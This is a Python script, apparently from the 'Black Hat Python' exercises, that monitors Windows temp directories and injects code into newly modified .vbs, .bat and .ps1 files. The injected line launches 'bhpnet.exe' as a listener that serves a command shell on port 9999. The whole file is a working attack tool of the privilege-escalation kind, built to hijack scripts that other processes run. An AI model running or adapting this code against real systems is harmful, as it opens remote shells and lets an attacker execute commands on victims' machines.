import tempfile
import threading
import win32file
import win32con
import os

# Payload to inject
command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"

file_types = {
    '.vbs': [
        "\n'bhpmarker\n",
        f"\nCreateObject(\"Wscript.Shell\").Run(\"{command}\")\n"
    ],
    '.bat': [
        "\nREM bhpmarker\n",
        f"\n{command}\n"
    ],
    '.ps1': [
        "\n#bhpmarker\n",
        f"Start-Process \"{command}\"\n"
    ]
}

def inject_code(full_filename, extension, contents):
    try:
        decoded = contents.decode('utf-8', errors='ignore')
        if file_types[extension][0] in decoded:
            print(f"[!] Marker already present in: {full_filename}")
            return

        full_contents = file_types[extension][0] + file_types[extension][1] + decoded
        with open(full_filename, "w", encoding="utf-8") as f:
            f.write(full_contents)
        print(f"[\\o/] Injected code into {full_filename}")

    except Exception as e:
        print(f"[!!!] Injection failed for {full_filename}: {e}")

# Common temp file directories to monitor
dirs_to_monitor = [
    "C:\\WINDOWS\\Temp",
    tempfile.gettempdir()
]

# File modification constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

def start_monitor(path_to_watch):
    FILE_LIST_DIRECTORY = 0x0001
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )

            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                extension = os.path.splitext(full_filename)[1].lower()

                if action == FILE_CREATED:
                    print(f"[ + ] Created: {full_filename}")

                elif action == FILE_DELETED:
                    print(f"[ - ] Deleted: {full_filename}")

                elif action == FILE_MODIFIED:
                    print(f"[ * ] Modified: {full_filename}")
                    try:
                        with open(full_filename, "rb") as f:
                            contents = f.read()
                            print(contents.decode('utf-8', errors='ignore'))
                        if extension in file_types:
                            inject_code(full_filename, extension, contents)
                    except Exception as e:
                        print(f"[!!!] Failed to read/inject: {e}")

                elif action == FILE_RENAMED_FROM:
                    print(f"[ > ] Renamed from: {full_filename}")

                elif action == FILE_RENAMED_TO:
                    print(f"[ < ] Renamed to: {full_filename}")

                else:
                    print(f"[???] Unknown action on: {full_filename}")

        except Exception as e:
            print(f"[!!!] Monitoring error: {e}")
            continue

# Launch threads for each path
for path in dirs_to_monitor:
    if os.path.exists(path):
        print(f"[+] Spawning monitoring thread for path: {path}")
        t = threading.Thread(target=start_monitor, args=(path,), daemon=True)
        t.start()
    else:
        print(f"[!] Skipping invalid path: {path}")

# Keep main thread alive
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[!] Exiting monitor.")
